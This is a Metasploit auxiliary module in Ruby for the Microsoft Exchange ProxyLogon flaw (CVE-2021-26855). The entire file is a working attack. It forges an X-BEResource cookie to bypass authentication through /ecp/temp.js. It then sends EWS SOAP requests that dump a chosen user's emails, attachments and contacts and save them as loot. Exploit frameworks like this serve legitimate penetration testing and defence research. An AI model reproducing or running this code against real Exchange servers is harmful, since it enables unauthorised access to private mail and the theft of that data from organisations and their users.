##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# begin auxiliary class
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon Collector',
        'Description' => %q{
          This module scan for a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication and impersonating as the
          admin (CVE-2021-26855).

          By chaining this bug with another post-auth arbitrary-file-write
          vulnerability to get code execution (CVE-2021-27065).

          As a result, an unauthenticated attacker can execute arbitrary commands on
          Microsoft Exchange Server.

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'http://aka.ms/exchangevulns'],
          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Actions' => [
          [
            'Dump (Contacts)', {
              'Description' => 'Dump user contacts from exchange server',
              'id_attribute' => 'contacts'
            }
          ],
          [
            'Dump (Emails)', {
              'Description' => 'Dump user emails from exchange server'
            }
          ]
        ],
        'DefaultAction' => 'Dump (Emails)',
        'Notes' => {
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]),
      OptString.new('EMAIL', [true, 'The email account what you want dump']),
      OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
      OptString.new('SERVER_NAME', [true, 'The name of secondary internal Exchange server targeted'])
    ])

    register_advanced_options([
      OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 2147483647])
    ])
  end

  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze

  def dump_contacts
    response = post_xml(soap_countitems(action['id_attribute']))
    if response.body =~ /Success/
      print_status(message('Connection established'))

      xml = Nokogiri::XML.parse(response.body)
      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS).values[0]
      print_status(" * selected folder: #{action['id_attribute']} (#{folder_id})")

      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS).content
      print_status(" * number of contact found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning(" * number of contact recaluled due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end
      print_status

      response = post_xml(soap_listitems(action['id_attribute'], total_count))
      xml = Nokogiri::XML.parse(response.body)

      print_status(message("Processing dump of #{total_count} items"))
      data = xml.xpath('//t:Items/t:Contact', XMLNS)
      if data.empty?
        print_status(' * the user has no contacts')
      else
        write_loot("#{datastore['EMAIL']}_#{action['id_attribute']}", data.to_s)
      end
    end
  end

  def dump_emails
    response = post_xml(soap_countitems(datastore['FOLDER']))
    if response.body =~ /Success/
      print_status(message('Connection established'))

      xml = Nokogiri::XML.parse(response.body)
      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS).values[0]
      print_status(" * selected folder: #{datastore['FOLDER']} (#{folder_id})")

      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS).content
      print_status(" * number of email found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning(" * number of email recaluled due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end
      print_status

      print_status(message("Processing dump of #{total_count} items"))
      download_items(total_count)
    end
  end

  def download_attachments(item_id)
    response = post_xml(soap_listattachments(item_id))
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).select do |item|
      item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]

      response = post_xml(soap_downattachment(item_id))
      data = Nokogiri::XML.parse(response.body)

      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS).content
      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS).content
      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS).content

      print_status(" * download attachment: '#{filename}'")
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(content), filename, ctype)
    end
  end

  def download_items(total_count)
    response = post_xml(soap_listitems(datastore['FOLDER'], total_count))
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath('//t:Items/t:Message', XMLNS).select do |item|
      item_info = item.at_xpath('./t:ItemId', XMLNS).values
      print_status(" * download: #{item_info[1]}")

      attachments = item.at_xpath('./t:HasAttachments', XMLNS).content
      if datastore['ATTACHMENTS'] && attachments == 'true'
        download_attachments(item_info[0])
      end

      response = post_xml(soap_downitem(item_info[0], item_info[1]))
      data = Nokogiri::XML.parse(response.body)

      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS).content
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(email))
      print_status
    end
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def post_xml(data)
    uri = normalize_uri('ecp', 'temp.js')

    received = send_request_cgi(
      'method' => 'POST',
      'uri' => uri,
      'cookie' => "X-BEResource=#{datastore['SERVER_NAME']}/EWS/Exchange.asmx?a=~3;",
      'ctype' => 'text/xml; charset=utf-8',
      'data' => data
    )
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_countitems(folder_id)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetFolder>
            <m:FolderShape>
              <t:BaseShape>Default</t:BaseShape>
            </m:FolderShape>
            <m:FolderIds>
              <t:DistinguishedFolderId Id="#{folder_id}">
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:FolderIds>
          </m:GetFolder>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listattachments(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:AdditionalProperties>
                <t:FieldURI FieldURI="item:Attachments" />
              </t:AdditionalProperties>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{item_id}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listitems(folder_id, max_entries)
    <<~SOAP
      <?xml version='1.0' encoding='utf-8'?>
      <soap:Envelope
      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
        <soap:Body>
          <m:FindItem Traversal='Shallow'>
            <m:ItemShape>
              <t:BaseShape>AllProperties</t:BaseShape>
            </m:ItemShape>
            <m:IndexedPageItemView MaxEntriesReturned="#{max_entries}" Offset="0" BasePoint="Beginning" />
            <m:ParentFolderIds>
              <t:DistinguishedFolderId Id='#{folder_id}'>
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:ParentFolderIds>
          </m:FindItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downattachment(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetAttachment>
            <m:AttachmentIds>
              <t:AttachmentId Id="#{item_id}" />
            </m:AttachmentIds>
          </m:GetAttachment>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downitem(id, change_key)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:IncludeMimeContent>true</t:IncludeMimeContent>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{id}" ChangeKey="#{change_key}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def write_loot(type, data, name = '', ctype = 'text/plain')
    loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '')
    print_good(" * file saved to #{loot_path}")
  end

  def run
    @proto = (ssl ? 'https' : 'http')

    case action.name
    when /Dump \(Contacts\)/
      print_status(message("Attempt to dump contacts for <#{datastore['EMAIL']}>"))
      dump_contacts
    when /Dump \(Emails\)/
      print_status(message("Attempt to dump emails for <#{datastore['EMAIL']}>"))
      dump_emails
    end
  end

end
